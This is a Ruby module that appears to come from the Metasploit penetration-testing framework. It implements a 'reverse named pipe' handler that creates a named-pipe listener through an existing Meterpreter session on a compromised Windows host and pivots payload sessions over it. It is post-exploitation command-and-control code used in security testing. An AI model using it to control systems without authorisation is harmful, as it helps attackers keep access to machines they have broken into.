# -*- coding: binary -*-
require 'thread'
require 'msf/core/post_mixin'

module Msf
module Handler
###
#
# This module implements the reverse named pipe handler. This handler
# requires an existing session via Meterpreter, as it creates a named
# pipe server on the target session and traffic is pivoted through that
# using the channel functionality. This is Windows-only at the moment.
#
###
module ReverseNamedPipe

  include Msf::Handler
  include Msf::PostMixin

  #
  # Returns the string representation of the handler type, in this case
  # 'reverse_named_pipe'.
  #
  def self.handler_type
    "reverse_named_pipe"
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'reverse'.
  #
  def self.general_handler_type
    "reverse"
  end

  #
  # Initializes the reverse handler and ads the options that are required
  # for reverse named pipe payloads.
  #
  def initialize(info = {})
    super

    register_options([
      OptString.new('PIPENAME', [true, 'Name of the pipe to listen on', 'msf-pipe']),
      OptString.new('PIPEHOST', [true, 'Host of the pipe to connect to', '.'])
    ], Msf::Handler::ReverseNamedPipe)

    self.conn_threads = []
  end

  #
  # Closes the listener socket if one was created.
  #
  def cleanup_handler
    stop_handler

    # Kill any remaining handle_connection threads that might
    # be hanging around
    conn_threads.each do |thr|
      begin
        thr.kill
      rescue
        nil
      end
    end
  end

  # A string suitable for displaying to the user
  #
  # @return [String]
  def human_name
    "reverse named pipe"
  end

  #
  # Starts monitoring for an inbound connection.
  #
  def start_handler
    queue = ::Queue.new

    # The 'listen' option says "behave like a server".
    # The 'repeat' option tells the target to create another named pipe
    # handle when a new client is established so that it operates like
    # a typical server. Named pipes are a bit awful in this regard.
    # So we use the 'ExitOnSession' functionality to tell the target
    # whether or not to do "one-shot" or "keep going".
    self.server_pipe = session.net.named_pipe.create({
      listen: true,
      name:   datastore['PIPENAME'],
      host:   datastore['PIPEHOST'],
      repeat: datastore['ExitOnSession'] == false
    })

    server_pipe = self.server_pipe

    self.listener_thread = framework.threads.spawn(listener_name, false, queue) { |lqueue|
      loop do
        # Accept a client connection
        begin
          channel = server_pipe.accept
          if channel
            self.pending_connections += 1
            lqueue.push(channel)
          end
        rescue StandardError => e
          wlog [
            "#{listener_name}: Exception raised during listener accept: #{e.class}",
            "#{$ERROR_INFO}",
            "#{$ERROR_POSITION.join("\n")}"
          ].join("\n")
        end
      end
    }

    self.handler_thread = framework.threads.spawn(worker_name, false, queue) { |cqueue|
      loop do
        begin
          channel = cqueue.pop

          unless channel
            elog("#{worker_name}: Queue returned an empty result, exiting...")
          end

          # Timeout and datastore options need to be passed through to the channel.
          # We indicate that we want to skip SSL because that isn't suppored (or
          # needed?) over the named pipe comms.
          opts = {
            datastore:     datastore,
            channel:       channel,
            skip_ssl:      true,
            expiration:    datastore['SessionExpirationTimeout'].to_i,
            comm_timeout:  datastore['SessionCommunicationTimeout'].to_i,
            retry_total:   datastore['SessionRetryTotal'].to_i,
            retry_wait:    datastore['SessionRetryWait'].to_i
          }

          # pass this right through to the handler, the channel should "just work"
          handle_connection(channel.lsock, opts)
        rescue StandardError
          elog("Exception raised from handle_connection: #{$ERROR_INFO.class}: #{$ERROR_INFO}\n\n#{$ERROR_POSITION.join("\n")}")
        end
      end
    }
  end

  #
  # Stops monitoring for an inbound connection.
  #
  def stop_handler
    # Terminate the listener thread
    listener_thread.kill if listener_thread && listener_thread.alive? == true

    # Terminate the handler thread
    handler_thread.kill if handler_thread && handler_thread.alive? == true

    if server_pipe
      begin
        server_pipe.close
      rescue IOError
        # Ignore if it's listening on a dead session
        dlog("IOError closing pipe listener; listening on dead session?", LEV_1)
      end
    end
  end

protected

  def listener_name
    @listener_name |= "ReverseNamedPipeHandlerListener-#{datastore['PIPENAME']}-#{datastore['SESSION']}"
    @listener_name
  end

  def worker_name
    @worker_name |= "ReverseNamedPipeHandlerWorker-#{datastore['PIPENAME']}-#{datastore['SESSION']}"
    @worker_name
  end

  attr_accessor :server_pipe # :nodoc:
  attr_accessor :listener_thread # :nodoc:
  attr_accessor :handler_thread # :nodoc:
  attr_accessor :conn_threads # :nodoc:
end
end
end

